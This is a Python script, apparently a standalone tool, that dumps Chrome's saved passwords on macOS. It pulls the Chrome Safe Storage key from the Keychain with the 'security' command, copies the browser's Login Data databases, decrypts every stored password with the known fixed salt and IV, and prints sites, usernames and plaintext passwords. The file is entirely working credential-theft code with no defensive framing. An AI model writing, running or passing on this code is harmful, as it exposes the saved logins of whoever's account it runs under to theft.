#!/usr/bin/python3
import os
import sqlite3
import binascii
import subprocess
import base64
import sys
import hashlib
from Cryptodome.Cipher import AES
import shutil
from colorama import Fore, Style

def get_safe_storage_key():
    cmd = [
        "security",
        "find-generic-password",
        "-ga",
        "Chrome",
        "-w"
    ]
    try:
        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL)
        safe_storage_key = output.strip()
        return safe_storage_key
    except subprocess.CalledProcessError:
        print("ERROR getting Chrome Safe Storage Key")
        return None

def decrypt_mac_chrome_password(encrypted_value, safe_storage_key):
    iv = b' ' * 16
    key = hashlib.pbkdf2_hmac('sha1', safe_storage_key, b'saltysalt', 1003)[:16]

    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted_pass = cipher.decrypt(encrypted_value)
    decrypted_pass = decrypted_pass.rstrip(b"\x04").decode("utf-8", "ignore")
    decrypted_pass = decrypted_pass.replace("\x08", "")  # Remove backspace characters
    return decrypted_pass

def chrome_process(safe_storage_key, login_data):
    decrypted_list = []
    conn = None
    try:
        conn = sqlite3.connect(login_data)
        cursor = conn.cursor()
        cursor.execute("SELECT username_value, password_value, origin_url FROM logins")
        rows = cursor.fetchall()
        for row in rows:
            user = row[0]
            encrypted_pass = row[1][3:]  # removing 'v10' prefix
            url = row[2]
            if user == "" or encrypted_pass == "":
                continue
            else:
                decrypted_pass = decrypt_mac_chrome_password(encrypted_pass, safe_storage_key)
                url_user_pass_decrypted = (
                    url.encode('ascii', 'ignore'),
                    user.encode('ascii', 'ignore'),
                    decrypted_pass.encode('ascii', 'ignore')
                )
                decrypted_list.append(url_user_pass_decrypted)
    except sqlite3.Error as e:
        print("SQLite error:", e)
    finally:
        if conn:
            conn.close()

    return decrypted_list

# Main code
profile_path = os.path.expanduser("~/Library/Application Support/Google/Chrome/Default")

login_data = [
    os.path.join(profile_path, "Login Data"),
    os.path.join(profile_path, "Login Data For Account")
]

safe_storage_key = get_safe_storage_key()
if safe_storage_key is None:
    sys.exit()

all_decrypted_passwords = []
for data_file in login_data:
    if os.path.exists(data_file):
        # Create a temporary copy of the SQLite database
        temp_data_file = os.path.join(profile_path, "Temp Login Data")
        shutil.copyfile(data_file, temp_data_file)
        decrypted_passwords = chrome_process(safe_storage_key, temp_data_file)
        all_decrypted_passwords.extend(decrypted_passwords)
        # Delete the temporary copy
        os.remove(temp_data_file)

if all_decrypted_passwords:
    header = (Fore.BLUE + "No.", "Site", "Username", "Password" + Style.RESET_ALL)
    print(all_decrypted_passwords)
    print(f"{header[0]:<5} {header[1]:<30} {header[2]:<20} {header[3]:<20}")
    print("=" * 80)
    
    for i, x in enumerate(all_decrypted_passwords):
        print(f"{Fore.GREEN}{i+1:<5}{Style.RESET_ALL} {Fore.CYAN}{x[0].decode():<30}{Style.RESET_ALL} {Fore.YELLOW}{x[1].decode():<20}{Style.RESET_ALL} {Fore.RED}{x[2].decode():<20}{Style.RESET_ALL}")
else:
    print("No Chrome passwords found in the specified profiles.")
